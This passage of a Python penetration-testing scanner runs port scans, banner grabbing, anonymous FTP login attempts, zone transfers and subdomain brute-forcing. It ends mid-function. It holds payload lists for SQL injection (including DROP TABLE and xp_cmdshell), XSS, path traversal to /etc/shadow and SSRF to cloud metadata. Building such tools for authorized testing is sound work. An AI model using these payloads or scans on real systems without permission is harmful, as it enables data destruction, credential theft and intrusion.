#!/usr/bin/env python3
"""
Advanced Security Assessment Tool (ASAT) 
Author: Dev Somani
Happy Hacking! 🚀

A multi-phase automated security assessment tool for network, subdomain, and web application testing.
"""

import argparse
import socket
import ssl
import json
import re
import sys
import time
import datetime
import ipaddress
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict
from typing import Dict, List, Tuple, Set, Optional, Any
import warnings
warnings.filterwarnings('ignore')

# Third-party imports
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    import dns.resolver
    import dns.zone
    import dns.query
    from dns.exception import DNSException
    
    import whois
    
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    
    import nmap
    
    from bs4 import BeautifulSoup
    
except ImportError as e:
    print(f"[!] Missing required dependency: {e}")
    print("[!] Please install: pip install python-nmap requests dnspython whois colorama beautifulsoup4")
    sys.exit(1)

# ==================== CONFIGURATION ====================
VERSION = "1.0"
AUTHOR = "Dev Somani"
BANNER = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗ ███████╗ █████╗ ████████╗    ██╗   ██╗██████╗   ║
║    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝    ██║   ██║██╔══██╗  ║
║    ███████║███████╗███████║   ██║       ██║   █�█████╔╝  ║
║    ██╔══██║╚════██║██╔══██║   ██║       ██║   ██║██╔══██╗  ║
║    ██║  ██║███████║██║  ██║   ██║       ╚██████╔██████╔╝  ║
║    ╚═╝  ╚══════╚═╝  ╚═╝   ╚═╝        ╚═════╝╚═════╝   ║
║                                                              ║
║           Advanced Security Assessment Tool v{VERSION}                ║
║                    Happy Hacking by {AUTHOR}                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
[!] DISCLAIMER: This tool is for authorized security testing only!
[!] Unauthorized use against systems you don't own is illegal!
[!] By using this tool, you agree to use it responsibly and ethically.
{Style.RESET_ALL}
"""

# Color definitions
# General Status Markers
INFO = Fore.BLUE + "[*]" + Style.RESET_ALL
SUCCESS = Fore.GREEN + "[+]" + Style.RESET_ALL
WARNING = Fore.YELLOW + "[!]" + Style.RESET_ALL
CRITICAL = Fore.RED + "[!!]" + Style.RESET_ALL
PROGRESS = Fore.CYAN + "[>]" + Style.RESET_ALL

# Vulnerability Markers (Special Finding Markers)
V_CRITICAL = f"{Fore.RED}{Back.BLACK}{Style.BRIGHT}[CRITICAL ☠]{Style.RESET_ALL}"
V_HIGH     = f"{Fore.RED}[HIGH ✖]{Style.RESET_ALL}"
V_MEDIUM   = f"{Fore.YELLOW}[MEDIUM ⚠]{Style.RESET_ALL}"
V_LOW      = f"{Fore.BLUE}[LOW ℹ]{Style.RESET_ALL}"
V_INFO     = f"{Fore.CYAN}[INFO •]{Style.RESET_ALL}"

# Common subdomains wordlist
SUBDOMAINS_WORDLIST = [
    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
    'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
    'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
    'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
    'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
    'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video',
    'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'pro', 'mail1', 'en', 'id',
    'us', 'ns4', 'www3', 'home', 'apps', 'info', 'tech', 'database', 'stage',
    'monitor', 'storage', 'backup', 'remote', 'server', 'ssh', 'gateway', 'firewall',
    'proxy', 'upload', 'download', 'files', 'assets', 'resources', 'css', 'js',
    'img2', 'images2', 'static2', 'newsletter', 'register', 'login', 'signup',
    'account', 'accounts', 'user', 'users', 'member', 'members', 'profile',
    'profiles', 'dashboard', 'control', 'panel', 'admin2', 'administrator',
    'root', 'super', 'sysadmin', 'manager', 'management', 'operations', 'ops'
]

# Dangerous ports and their services
DANGEROUS_PORTS = {
    21: 'FTP - Anonymous access possible',
    23: 'Telnet - Unencrypted protocol',
    25: 'SMTP - Open relay possible',
    445: 'SMB - Potential for SMB vulnerabilities',
    3389: 'RDP - Remote Desktop Protocol',
    1433: 'MSSQL - Database server',
    3306: 'MySQL - Database server',
    5432: 'PostgreSQL - Database server',
    27017: 'MongoDB - Database server',
    6379: 'Redis - Database server',
    11211: 'Memcached - Cache server',
    9200: 'Elasticsearch - Database server',
    5900: 'VNC - Remote access',
    5800: 'VNC - Remote access (HTTP)',
    161: 'SNMP - Community strings',
    389: 'LDAP - Directory service',
    636: 'LDAPS - Secure LDAP',
    873: 'Rsync - File sync service',
    512: 'Rexec - Remote execution',
    513: 'Rlogin - Remote login',
    514: 'RSH - Remote shell',
    2049: 'NFS - Network File System',
    111: 'RPC - Portmapper',
    135: 'MSRPC - Windows RPC',
    139: 'NetBIOS - File sharing',
    1521: 'Oracle - Database server',
    2483: 'Oracle - Database server',
    2484: 'Oracle - Database server',
    2082: 'cPanel - Control panel',
    2083: 'cPanel SSL - Control panel',
    2086: 'WHM - Control panel',
    2087: 'WHM SSL - Control panel',
    8888: 'Webmin - Control panel',
    10000: 'Webmin - Control panel',
    8443: 'Plesk - Control panel',
    9443: 'Plesk - Control panel'
}

# Common admin panels for detection
ADMIN_PANELS = [
    '/admin', '/administrator', '/admincp', '/adminarea', '/adm', '/adminpanel',
    '/manage', '/manager', '/management', '/dashboard', '/controlpanel', '/cp',
    '/cpanel', '/webadmin', '/sysadmin', '/system', '/backend', '/secure',
    '/wp-admin', '/wp-login.php', '/joomla/administrator', '/drupal/admin',
    '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin', '/mysqladmin',
    '/tomcat-manager', '/manager/html', '/admin/login', '/user/login',
    '/admin/login.php', '/login/admin', '/admin/index.php', '/admin/home',
    '/admin/dashboard', '/admin/panel', '/moderator', '/mod', '/staff'
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' GROUP BY 1--",
    "1' GROUP BY 2--",
    "1' GROUP BY 3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "'; DROP TABLE users--",
    "'; DELETE FROM users--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; EXEC xp_cmdshell('whoami')--"
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "\" onmouseover=\"alert('XSS')\"",
    "';alert('XSS');//"
]

# Path traversal payloads
PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/group",
    "../../../../etc/issue",
    "../../../../etc/motd",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/httpd/access.log",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd"
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://localhost:80",
    "http://localhost:443",
    "http://[::1]:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/metadata/instance?api-version=2017-08-01",  # Azure
    "http://metadata.google.internal/",  # GCP
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1"
]

# ==================== UTILITY CLASSES ====================
class Colors:
    """Color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ProgressIndicator:
    """Simple progress indicator for long-running tasks"""
    def __init__(self, total, description="Progress"):
        self.total = total
        self.current = 0
        self.description = description
        self.lock = threading.Lock()
        self.start_time = time.time()
        
    def update(self, amount=1):
        with self.lock:
            self.current += amount
            self._display()
    
    def _display(self):
        percentage = (self.current / self.total) * 100
        elapsed = time.time() - self.start_time
        bar_length = 40
        filled = int(bar_length * self.current // self.total)
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f'\r{PROGRESS} {self.description}: [{bar}] {percentage:.1f}% ({self.current}/{self.total}) - {elapsed:.1f}s')
        sys.stdout.flush()
        if self.current >= self.total:
            print()

class RiskRating:
    """Risk rating classifications"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"
    
    @staticmethod
    def color(rating):
        colors = {
            RiskRating.CRITICAL: Fore.RED + Back.BLACK + Style.BRIGHT,
            RiskRating.HIGH: Fore.RED,
            RiskRating.MEDIUM: Fore.YELLOW,
            RiskRating.LOW: Fore.BLUE,
            RiskRating.INFO: Fore.CYAN
        }
        return colors.get(rating, Fore.WHITE)

    @staticmethod
    def marker(rating):
        markers = {
            RiskRating.CRITICAL: V_CRITICAL,
            RiskRating.HIGH: V_HIGH,
            RiskRating.MEDIUM: V_MEDIUM,
            RiskRating.LOW: V_LOW,
            RiskRating.INFO: V_INFO
        }
        return markers.get(rating, INFO)

class Finding:
    """Class to store individual findings"""
    def __init__(self, title, description, risk_rating, remediation, phase):
        self.title = title
        self.description = description
        self.risk_rating = risk_rating
        self.remediation = remediation
        self.phase = phase
        self.timestamp = datetime.datetime.now().isoformat()
        self.evidence = []
    
    def add_evidence(self, evidence):
        self.evidence.append(evidence)
    
    def to_dict(self):
        return {
            'title': self.title,
            'description': self.description,
            'risk_rating': self.risk_rating,
            'remediation': self.remediation,
            'phase': self.phase,
            'timestamp': self.timestamp,
            'evidence': self.evidence
        }
    
    def __str__(self):
        marker = RiskRating.marker(self.risk_rating)
        return f"{marker} {self.title}\n    Description: {self.description}\n    Remediation: {self.remediation}"

class Report:
    """Class to handle report generation"""
    def __init__(self, target):
        self.target = target
        self.start_time = datetime.datetime.now()
        self.findings = []
        self.scan_summary = defaultdict(int)
        
    def add_finding(self, finding):
        self.findings.append(finding)
        self.scan_summary[finding.risk_rating] += 1
    
    def generate_text_report(self):
        """Generate a formatted text report"""
        end_time = datetime.datetime.now()
        duration = end_time - self.start_time
        
        report = []
        report.append("=" * 80)
        report.append(f"SECURITY ASSESSMENT REPORT - {self.target}")
        report.append(f"Scan started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Scan ended: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total duration: {duration}")
        report.append("=" * 80)
        report.append("\n")
        
        # Executive Summary
        report.append("EXECUTIVE SUMMARY")
        report.append("-" * 40)
        total_findings = len(self.findings)
        report.append(f"Total findings: {total_findings}")
        report.append(f"Critical: {self.scan_summary.get(RiskRating.CRITICAL, 0)}")
        report.append(f"High: {self.scan_summary.get(RiskRating.HIGH, 0)}")
        report.append(f"Medium: {self.scan_summary.get(RiskRating.MEDIUM, 0)}")
        report.append(f"Low: {self.scan_summary.get(RiskRating.LOW, 0)}")
        report.append(f"Info: {self.scan_summary.get(RiskRating.INFO, 0)}")
        report.append("\n")
        
        # Findings by Phase
        phases = ['Network', 'Subdomain', 'Web']
        for phase in phases:
            phase_findings = [f for f in self.findings if f.phase == phase]
            if phase_findings:
                report.append(f"\n{phase.upper()} PHASE FINDINGS")
                report.append("-" * 40)
                for finding in phase_findings:
                    color = RiskRating.color(finding.risk_rating)
                    report.append(f"\n{color}[{finding.risk_rating}]{Style.RESET_ALL} {finding.title}")
                    report.append(f"  Description: {finding.description}")
                    if finding.evidence:
                        report.append("  Evidence:")
                        for evidence in finding.evidence[:3]:  # Limit evidence
                            report.append(f"    - {evidence}")
                    report.append(f"  Remediation: {finding.remediation}")
        
        return "\n".join(report)
    
    def generate_json_report(self):
        """Generate JSON report"""
        return json.dumps({
            'target': self.target,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.datetime.now().isoformat(),
            'summary': dict(self.scan_summary),
            'findings': [f.to_dict() for f in self.findings]
        }, indent=2)

# ==================== PHASE 1: NETWORK SCAN ====================
class NetworkScanner:
    """Phase 1: Network reconnaissance and scanning"""
    
    def __init__(self, target, report, verbose=False):
        self.target = re.sub(r'^https?://', '', target).split('/')[0]
        self.report = report
        self.verbose = verbose
        self.resolved_ips = []
        self.open_ports = []
        
    def run(self):
        """Execute all network scan phases"""
        print(f"\n{INFO} Starting Phase 1: Network Scan on {self.target}")
        
        # Host Discovery
        self.host_discovery()
        
        # Port Scanning
        self.port_scan()
        
        # Banner Grabbing
        self.grab_banners()
        
        # Network Information
        self.network_info()
        
        # Vulnerability Checks
        self.vulnerability_checks()
        
        # Firewall Detection
        self.firewall_detection()
        
        print(f"{SUCCESS} Phase 1 completed")
    
    def host_discovery(self):
        """Discover host and resolve DNS"""
        print(f"\n{INFO} Host Discovery")
        
        try:
            # Resolve hostname to IP
            ip = socket.gethostbyname(self.target)
            self.resolved_ips.append(ip)
            print(f"{SUCCESS} Resolved {self.target} -> {ip}")
            
            # Reverse DNS lookup
            try:
                hostname, _, _ = socket.gethostbyaddr(ip)
                print(f"{SUCCESS} Reverse DNS: {ip} -> {hostname}")
            except:
                print(f"{WARNING} No reverse DNS record found")
            
            # Ping sweep
            print(f"{PROGRESS} Checking if host is alive...")
            response = subprocess.run(['ping', '-c', '1', '-W', '2', ip], 
                                    capture_output=True, text=True)
            if response.returncode == 0:
                print(f"{SUCCESS} Host is alive (responds to ping)")
                finding = Finding(
                    "Host is reachable",
                    f"Target {self.target} ({ip}) responds to ICMP ping",
                    RiskRating.INFO,
                    "N/A - This is informational",
                    "Network"
                )
                self.report.add_finding(finding)
            else:
                print(f"{WARNING} Host does not respond to ping (may be firewalled)")
                
        except socket.gaierror:
            print(f"{V_MEDIUM} Could not resolve hostname")
            finding = Finding(
                "DNS Resolution Failed",
                f"Could not resolve hostname: {self.target}",
                RiskRating.MEDIUM,
                "Verify the target domain exists and is properly configured",
                "Network"
            )
            self.report.add_finding(finding)
    
    def port_scan(self):
        """Perform comprehensive port scan using nmap"""
        print(f"\n{INFO} Port Scanning (this may take a while...)")
        
        try:
            nm = nmap.PortScanner()
            
            # Progress indicator
            print(f"{PROGRESS} Performing SYN scan on ports 1-65535...")
            
            # Perform SYN scan with version detection and OS fingerprinting
            nm.scan(self.target, arguments='-sS -sV -O -T4 -p 1-65535 --min-rate 1000')
            
            for host in nm.all_hosts():
                print(f"\n{SUCCESS} Host: {host}")
                
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port].get('name', 'unknown')
                        version = nm[host][proto][port].get('version', '')
                        
                        port_info = f"{port}/{proto} - {state} - {service} {version}"
                        
                        if state == 'open':
                            print(f"{SUCCESS} {port_info}")
                            self.open_ports.append({
                                'port': port,
                                'protocol': proto,
                                'service': service,
                                'version': version
                            })
                            
                            # Check if it's a dangerous port
                            if int(port) in DANGEROUS_PORTS:
                                risk = RiskRating.HIGH if port in [21,23,445,3389] else RiskRating.MEDIUM
                                print(f"{RiskRating.marker(risk)} Dangerous port detected: {port}")
                                finding = Finding(
                                    f"Dangerous port open: {port}",
                                    f"Port {port} ({service}) is open. This service is known to have security risks.",
                                    risk,
                                    f"Close the port if not needed. If required, ensure it's properly secured and behind firewall.",
                                    "Network"
                                )
                                finding.add_evidence(f"Service: {service}, Version: {version}")
                                self.report.add_finding(finding)
                                
                        elif state == 'filtered':
                            print(f"{WARNING} {port_info}")
                        else:
                            if self.verbose:
                                print(f"{INFO} {port_info}")
                
                # OS Detection
                if 'osmatch' in nm[host]:
                    for osmatch in nm[host]['osmatch']:
                        print(f"{INFO} OS Detection: {osmatch['name']} ({osmatch['accuracy']}% accuracy)")
                    
        except Exception as e:
            print(f"{WARNING} Port scan failed: {str(e)}")
    
    def grab_banners(self):
        """Grab banners from open ports using raw sockets"""
        print(f"\n{INFO} Banner Grabbing")
        
        for port_info in self.open_ports:
            port = port_info['port']
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, port))
                
                # Send a generic probe
                if port == 80 or port == 443:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                elif port == 21:
                    sock.send(b"HELP\r\n")
                elif port == 25:
                    sock.send(b"HELO test.com\r\n")
                else:
                    sock.send(b"\r\n")
                
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if banner:
                    print(f"{SUCCESS} Banner for port {port}: {banner[:100]}")
                    port_info['banner'] = banner
                    
                    # Check for sensitive information in banner
                    if any(keyword in banner.lower() for keyword in ['root', 'admin', 'password', 'vulnerable']):
                        print(f"{V_MEDIUM} Sensitive information in banner on port {port}")
                        finding = Finding(
                            f"Sensitive information in banner on port {port}",
                            f"Service banner reveals potentially sensitive information: {banner[:200]}",
                            RiskRating.MEDIUM,
                            "Disable or modify service banners to avoid information disclosure",
                            "Network"
                        )
                        self.report.add_finding(finding)
                        
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} Could not grab banner from port {port}: {str(e)}")
    
    def network_info(self):
        """Gather network information (WHOIS, GeoIP, Traceroute)"""
        print(f"\n{INFO} Gathering Network Information")
        
        # WHOIS Lookup
        try:
            print(f"{PROGRESS} Performing WHOIS lookup...")
            w = whois.whois(self.target)
            
            print(f"{SUCCESS} WHOIS Information:")
            print(f"  Registrar: {w.registrar}")
            print(f"  Creation Date: {w.creation_date}")
            print(f"  Expiration Date: {w.expiration_date}")
            print(f"  Name Servers: {w.name_servers}")
            
            finding = Finding(
                "WHOIS Information Collected",
                f"Domain registration information gathered",
                RiskRating.INFO,
                "N/A - This is informational",
                "Network"
            )
            finding.add_evidence(f"Registrar: {w.registrar}")
            self.report.add_finding(finding)
            
        except Exception as e:
            print(f"{WARNING} WHOIS lookup failed: {str(e)}")
        
        # GeoIP Lookup (using ip-api.com)
        try:
            print(f"{PROGRESS} Performing GeoIP lookup...")
            response = requests.get(f"http://ip-api.com/json/{self.resolved_ips[0]}", timeout=10)
            if response.status_code == 200:
                geo_data = response.json()
                if geo_data['status'] == 'success':
                    print(f"{SUCCESS} GeoIP Information:")
                    print(f"  Country: {geo_data['country']}")
                    print(f"  Region: {geo_data['regionName']}")
                    print(f"  City: {geo_data['city']}")
                    print(f"  ISP: {geo_data['isp']}")
                    print(f"  Organization: {geo_data['org']}")
                    print(f"  ASN: {geo_data['as']}")
                    
                    finding = Finding(
                        "GeoIP Information",
                        f"Geolocation data for target",
                        RiskRating.INFO,
                        "N/A - This is informational",
                        "Network"
                    )
                    self.report.add_finding(finding)
        except Exception as e:
            print(f"{WARNING} GeoIP lookup failed: {str(e)}")
        
        # Traceroute
        try:
            print(f"{PROGRESS} Performing traceroute...")
            if sys.platform == "win32":
                result = subprocess.run(['tracert', '-h', '15', self.target], 
                                      capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(['traceroute', '-m', '15', self.target], 
                                      capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"{SUCCESS} Traceroute completed (first 5 hops):")
                lines = result.stdout.split('\n')[:5]
                for line in lines:
                    print(f"  {line}")
        except Exception as e:
            print(f"{WARNING} Traceroute failed: {str(e)}")
    
    def vulnerability_checks(self):
        """Perform common vulnerability checks"""
        print(f"\n{INFO} Performing Vulnerability Checks")
        
        for port_info in self.open_ports:
            port = port_info['port']
            service = port_info['service'].lower()
            
            # FTP anonymous login check
            if port == 21 or 'ftp' in service:
                self.check_ftp_anonymous(port_info)
            
            # Telnet check
            if port == 23 or 'telnet' in service:
                print(f"{V_HIGH} Telnet service detected on port {port}")
                finding = Finding(
                    "Telnet Service Exposed",
                    "Telnet transmits data in cleartext and is inherently insecure",
                    RiskRating.HIGH,
                    "Replace Telnet with SSH for secure remote access",
                    "Network"
                )
                self.report.add_finding(finding)
            
            # SMB signing check
            if port == 445 or 'microsoft-ds' in service or 'smb' in service:
                self.check_smb_signing(port_info)
            
            # Default SSH port check
            if port == 22 and 'ssh' in service:
                print(f"{V_LOW} SSH on default port 22")
                finding = Finding(
                    "SSH on Default Port",
                    "SSH service running on default port 22",
                    RiskRating.LOW,
                    "Consider moving SSH to a non-standard port to reduce automated attacks",
                    "Network"
                )
                self.report.add_finding(finding)
    
    def check_ftp_anonymous(self, port_info):
        """Check if FTP allows anonymous login"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port_info['port']))
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Try anonymous login
            sock.send(b"USER anonymous\r\n")
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            if '331' in response:  # Password required
                sock.send(b"PASS anonymous@example.com\r\n")
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '230' in response:  # Login successful
                    print(f"{V_HIGH} FTP anonymous login allowed on port {port_info['port']}")
                    finding = Finding(
                        "FTP Anonymous Access Allowed",
                        f"FTP server on port {port_info['port']} allows anonymous login",
                        RiskRating.HIGH,
                        "Disable anonymous FTP access and implement proper authentication",
                        "Network"
                    )
                    self.report.add_finding(finding)
            
            sock.close()
            
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} FTP anonymous check failed: {str(e)}")
    
    def check_smb_signing(self, port_info):
        """Check if SMB signing is disabled"""
        try:
            # This is a simplified check - in reality would need SMB protocol implementation
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port_info['port']))
            
            # SMB Negotiate Protocol Request (simplified)
            smb_negotiate = (
                b"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x08\x01\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x00"
            )
            sock.send(smb_negotiate)
            response = sock.recv(1024)
            sock.close()
            
            # Check response for signing flags (simplified)
            if response and len(response) > 40:
                if response[39] & 0x08:  # Check if SMB signing is required
                    print(f"{SUCCESS} SMB signing is enabled")
                else:
                    print(f"{V_HIGH} SMB signing appears to be disabled")
                    finding = Finding(
                        "SMB Signing Disabled",
                        f"SMB server on port {port_info['port']} does not require packet signing",
                        RiskRating.HIGH,
                        "Enable SMB signing to prevent man-in-the-middle attacks",
                        "Network"
                    )
                    self.report.add_finding(finding)
                    
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} SMB signing check failed: {str(e)}")
    
    def firewall_detection(self):
        """Detect firewall/IDS presence using nmap techniques"""
        print(f"\n{INFO} Firewall/IDS Detection")
        
        try:
            nm = nmap.PortScanner()
            
            # Use various scan types to detect firewall
            scan_types = [
                ('-sS', 'SYN scan'),
                ('-sT', 'TCP connect scan'),
                ('-sA', 'ACK scan'),
                ('-sW', 'Window scan'),
                ('-sM', 'Maimon scan')
            ]
            
            results = {}
            for scan_type, desc in scan_types:
                nm.scan(self.target, arguments=f'{scan_type} -p 80,443,22 -T4')
                for host in nm.all_hosts():
                    for proto in nm[host].all_protocols():
                        ports = nm[host][proto].keys()
                        for port in ports:
                            state = nm[host][proto][port]['state']
                            if port not in results:
                                results[port] = []
                            results[port].append(state)
            
            # Analyze results for firewall indicators
            firewall_detected = False
            for port, states in results.items():
                if len(set(states)) > 1:  # Different scan types show different states
                    print(f"{WARNING} Potential firewall detected on port {port}: inconsistent states {states}")
                    firewall_detected = True
            
            if firewall_detected:
                finding = Finding(
                    "Firewall/IDS Detected",
                    "Inconsistent port states across different scan types suggest firewall or IDS presence",
                    RiskRating.INFO,
                    "N/A - This information can be used to plan further testing strategies",
                    "Network"
                )
                self.report.add_finding(finding)
            else:
                print(f"{INFO} No obvious firewall/IDS detected")
                
        except Exception as e:
            print(f"{WARNING} Firewall detection failed: {str(e)}")

# ==================== PHASE 2: SUBDOMAIN SCAN ====================
class SubdomainScanner:
    """Phase 2: Subdomain enumeration and DNS analysis"""
    
    def __init__(self, domain, report, verbose=False):
        self.domain = re.sub(r'^https?://', '', domain).split('/')[0]
        self.report = report
        self.verbose = verbose
        self.subdomains = []
        self.resolved_ips = defaultdict(list)
        self.takeover_vulnerable = []
        
    def run(self):
        """Execute all subdomain scan phases"""
        print(f"\n{INFO} Starting Phase 2: Subdomain Scan on {self.domain}")
        
        # DNS Record Enumeration
        self.dns_enumeration()
        
        # Zone Transfer Check
        self.check_zone_transfer()
        
        # Subdomain Bruteforce
        self.subdomain_bruteforce()
        
        # Certificate Transparency Logs
        self.certificate_transparency()
        
        # ASN & IP Range Discovery
        self.asn_discovery()
        
        # Subdomain Takeover Detection
        self.check_takeover()
        
        # Virtual Host Discovery
        self.vhost_discovery()
        
        print(f"{SUCCESS} Phase 2 completed")
    
    def dns_enumeration(self):
        """Enumerate all DNS record types"""
        print(f"\n{INFO} DNS Record Enumeration")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.domain, record_type, raise_on_no_answer=False)
                if answers:
                    print(f"{SUCCESS} {record_type} Records:")
                    for rdata in answers:
                        print(f"  {rdata}")
                        
                        # Add to report
                        finding = Finding(
                            f"DNS {record_type} Record Found",
                            f"DNS {record_type} record: {rdata}",
                            RiskRating.INFO,
                            "N/A - This is informational",
                            "Subdomain"
                        )
                        self.report.add_finding(finding)
            except dns.resolver.NoAnswer:
                if self.verbose:
                    print(f"{INFO} No {record_type} records found")
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} Error querying {record_type}: {str(e)}")
    
    def check_zone_transfer(self):
        """Check for zone transfer vulnerability (AXFR)"""
        print(f"\n{INFO} Checking for Zone Transfer Vulnerability")
        
        try:
            # Get nameservers
            ns_answers = dns.resolver.resolve(self.domain, 'NS')
            
            for ns in ns_answers:
                ns_name = str(ns).rstrip('.')
                try:
                    ns_ip = socket.gethostbyname(ns_name)
                    
                    # Attempt zone transfer
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, self.domain, timeout=5))
                    
                    if zone:
                        print(f"{V_HIGH} Zone transfer successful from {ns_name} ({ns_ip})!")
                        
                        # Extract records
                        records = []
                        for name, node in zone.nodes.items():
                            rdataset = node.rdatasets
                            records.append(f"{name} {rdataset}")
                        
                        finding = Finding(
                            "DNS Zone Transfer Vulnerable",
                            f"Zone transfer (AXFR) is allowed from nameserver {ns_name}",
                            RiskRating.HIGH,
                            "Restrict zone transfers to authorized servers only. Disable AXFR for external networks.",
                            "Subdomain"
                        )
                        finding.add_evidence(f"Retrieved {len(records)} DNS records")
                        self.report.add_finding(finding)
                        
                except Exception as e:
                    if self.verbose:
                        print(f"{INFO} Zone transfer failed from {ns_name}: {str(e)}")
                        
        except Exception as e:
            print(f"{WARNING} Zone transfer check failed: {str(e)}")
    
    def subdomain_bruteforce(self):
        """Bruteforce subdomains using wordlist"""
        print(f"\n{INFO} Subdomain Bruteforce")
        
        total = len(SUBDOMAINS_WORDLIST)
        progress = ProgressIndicator(total, "Bruteforcing subdomains")
        
        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{self.domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                progress.update()
                return subdomain, ip, full_domain
            except:
                progress.update()
                return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in SUBDOMAINS_WORDLIST]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomain, ip, full_domain = result
                    self.subdomains.append(full_domain)
                    self.resolved_ips[full_domain].append(ip)
                    print(f"\n{SUCCESS} Found: {full_domain} -> {ip}")
        
        print()  # New line after progress
        
        if self.subdomains:
            finding = Finding(
                "Subdomains Discovered",
                f"Found {len(self.subdomains)} subdomains through brute-forcing",
                RiskRating.INFO,
                "Review discovered subdomains and ensure they are properly secured",
                "Subdomain"
            )
            for sub in self.subdomains[:10]:  # Add first 10 as evidence
                finding.add_evidence(sub)
            self.report.add_finding(finding)
    
    def certificate_transparency(self):
        """Query crt.sh for certificate transparency logs"""
        print(f"\n{INFO} Querying Certificate Transparency Logs")
        
        try:
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            response = requests.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                cert_subdomains = set()
                
